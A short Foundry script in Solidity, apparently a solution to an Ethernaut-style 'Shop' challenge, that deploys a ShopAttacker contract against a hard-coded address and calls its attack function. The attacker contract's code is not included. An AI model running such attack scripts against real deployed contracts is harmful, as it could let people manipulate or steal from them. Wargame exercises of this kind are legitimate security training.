// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Shop} from "../src/Shop.sol";
import {ShopAttacker} from "../src/ShopAttacker.sol";
import {Script} from "forge-std/Script.sol";

contract ShopScript is Script {
    Shop target;
    ShopAttacker attacker;

    function run() public {
        target = Shop(0x3007F62B8af9Bc762c4553DB6A20057c7190Ff85);
        vm.startBroadcast();
        attacker = new ShopAttacker(address(target));
        attacker.attack();
        vm.stopBroadcast();
    }
}
